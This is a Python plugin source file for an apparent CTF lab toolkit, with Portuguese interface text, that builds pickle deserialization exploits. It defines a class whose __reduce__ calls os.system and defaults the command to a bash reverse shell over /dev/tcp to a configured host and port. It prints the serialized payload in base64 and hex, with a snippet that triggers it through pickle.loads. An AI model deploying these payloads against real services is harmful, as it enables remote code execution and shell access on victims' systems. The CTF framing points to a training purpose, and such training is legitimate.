"""
plugins/pickle_wizard.py — plugin: Python Pickle Deserialization Wizard.
"""

from __future__ import annotations

import base64
import pickle
from rich.console import Console
from ctflab.core.session import Session
from ctflab.cli.ui import ask

PLUGIN_NAME = "Python Pickle Wizard"
PLUGIN_DESC = "Gera payloads de deserialização insegura em Python (Pickle)"

class PickleRcePayload:
    def __init__(self, cmd: str):
        self.cmd = cmd

    def __reduce__(self):
        import os
        return (os.system, (self.cmd,))

def run(session: Session, console: Console) -> None:
    console.rule("[head]PYTHON PICKLE DESERIALIZATION WIZARD[/head]")
    console.print("[dim]Gera payloads de RCE explorando deserialização insegura de objetos Pickle em Python.[/dim]\n")

    # Recupera o payload de reverse shell da sessão ou solicita comando customizado
    default_cmd = session.recall("reverse_shell_payload", "")
    if not default_cmd:
        lhost = session.recall("lhost", "127.0.0.1")
        lport = session.recall("lport", "4444")
        default_cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"

    cmd = ask("Comando a ser executado pelo deserializador", default_cmd)

    # Cria o objeto malicioso e o serializa
    exploit_obj = PickleRcePayload(cmd)
    serialized_data = pickle.dumps(exploit_obj)
    
    # Diferentes formatos de payload comuns em desafios
    payload_b64 = base64.b64encode(serialized_data).decode()
    payload_hex = "".join(f"\\x{b:02x}" for b in serialized_data)

    console.print("\n" + "="*60)
    console.print("[ok]PAYLOADS PICKLE GERADOS[/ok]")
    console.print("="*60)
    
    console.print("[info]Formato Base64 (Ideal para cookies e headers):[/info]")
    console.print(payload_b64, style="bold yellow")
    
    console.print("\n[info]Formato Hexadecimal (Ideal para strings binárias):[/info]")
    console.print(payload_hex, style="bold yellow")
    
    console.print("="*60 + "\n")
    console.print("[info]Exemplo de Exploit em Script Python:[/info]")
    console.print(
        f"import pickle, base64\n"
        f"payload = base64.b64decode('{payload_b64}')\n"
        f"pickle.loads(payload) # triggers os.system",
        style="dim white"
    )
